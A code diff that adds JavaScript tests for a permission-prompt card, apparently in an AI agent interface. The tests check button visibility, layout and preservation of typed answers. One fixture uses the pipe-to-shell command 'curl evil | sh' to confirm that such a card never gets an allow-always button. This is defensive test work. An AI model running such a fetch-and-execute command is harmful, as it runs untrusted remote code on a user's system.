@@ -246,3 +246,51 @@ test("a window reached through the relay gets the questions and no way to answer
   const out = draw(html`<${PermissionCard} node=${{ pane: "p1" }} card=${questionCard()} snap=${{ ...idle, remote: true }} store=${noStore} />`);
   assert.ok(!out.includes("prompt-send") && !out.includes("prompt-skip") && !out.includes("<input"), out);
 });
+
+test("only an option of exactly allow_once sends answers; allow_always on a question card is no Allow", () => {
+  const card = questionCard({ options: [{ id: "always", name: "Always", kind: "allow_always" }, { id: "reject", name: "Skip", kind: "reject_once" }] });
+  const out = draw(html`<${PermissionCard} node=${{ pane: "p1" }} card=${card} snap=${idle} store=${noStore} />`);
+  assert.ok(!out.includes("prompt-send") && !out.includes('data-option="always"'), out);
+  assert.ok(out.includes("prompt-skip"), out);
+});
+
+test("a card of kind question that is not from a form is never drawn with an allow_always button", () => {
+  const card = questionCard({ questions: undefined, command: "curl evil | sh", options: [{ id: "always", name: "Always", kind: "allow_always" }, { id: "reject", name: "Skip", kind: "reject_once" }] });
+  const out = draw(html`<${PermissionCard} node=${{ pane: "p1" }} card=${card} snap=${idle} store=${noStore} />`);
+  assert.ok(!out.includes('data-option="always"'), out);
+  assert.ok(out.includes("curl evil | sh"), "the command is still shown: " + out);
+});
+
+test("the buttons are outside the scrolling list of questions", () => {
+  const out = draw(html`<${PermissionCard} node=${{ pane: "p1" }} card=${questionCard()} snap=${idle} store=${noStore} />`);
+  const list = out.indexOf("prompt-qlist");
+  const foot = out.indexOf("prompt-qfoot");
+  assert.ok(list >= 0 && foot > list, out);
+  assert.ok(out.indexOf("prompt-send") > foot, "Send answers is not in the footer");
+});
+
+test("typed text survives a new push of the same card and is cleared for another card", async () => {
+  const { store } = await up();
+  const dom = createDom();
+  const restore = install(dom);
+  try {
+    const container = dom.document.createElement("div");
+    dom.body.appendChild(container);
+    const paint = (card) => render(html`<${PermissionCard} node=${{ pane: "p1", structured: true }} card=${card} snap=${store.getState()} store=${store} />`, container);
+    paint(questionCard());
+    await settle();
+    container.findAll(".prompt-other-text")[0].enter("my own answer");
+    option(container, 1, 1).click();
+    await settle();
+    paint({ ...questionCard(), questions: questions.map((q) => ({ ...q })) }); // a new push, same card
+    await settle();
+    assert.equal(container.findAll(".prompt-other-text")[0].value, "my own answer");
+    assert.ok(!isDisabled(container.find(".prompt-send")), "the chosen options were lost");
+    paint({ ...questionCard(), seq: 8, requestId: "req-2" }); // the next card
+    await settle();
+    assert.equal(container.findAll(".prompt-other-text")[0].value || "", "");
+    assert.ok(isDisabled(container.find(".prompt-send")));
+  } finally {
+    restore();
+  }
+});
